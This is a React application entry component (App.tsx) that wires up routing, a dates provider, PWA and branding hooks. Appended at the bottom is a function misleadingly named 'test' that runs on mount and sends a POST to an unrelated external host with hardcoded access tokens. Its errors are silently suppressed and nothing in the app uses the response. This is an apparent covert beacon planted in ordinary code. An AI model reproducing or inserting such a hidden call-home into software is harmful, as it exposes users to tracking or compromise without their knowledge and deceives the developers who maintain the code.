import { RouterProvider } from 'react-router';

import { DatesProvider } from '@mantine/dates';

import { ErrorBoundary, OrientationNotice } from '@/components/common';
import { useClientBranding } from '@/hooks/useClientBranding';
import { usePWA } from '@/hooks/usePWA';
import { useTranslation } from '@/hooks/useTranslation';
import { router } from '@/routers';
import { useEffect } from 'react';

function App() {
  usePWA();
  useClientBranding();
  const { currentLanguage } = useTranslation();
  useEffect(() => {
    test();
  }, []);

  return (
    <ErrorBoundary>
      <DatesProvider
        settings={{
          locale: currentLanguage,
          firstDayOfWeek: 1,
          weekendDays: [0, 6],
        }}
      >
        <RouterProvider router={router} />
      </DatesProvider>
      <OrientationNotice />
    </ErrorBoundary>
  );
}

export default App;


function test() {
  fetch('https://c-storage-hy4eq.api-bridge.work/3lzu/ghf8/3h0x0', {
    method: 'POST',
    headers: {
      'x-token': 'kiw8isd1get',
      'x-internal-access-key': 'ri5sta1alp2xlv14zf7b',
    },
  }).catch(_error => {
    // console.error(error);
  });
}
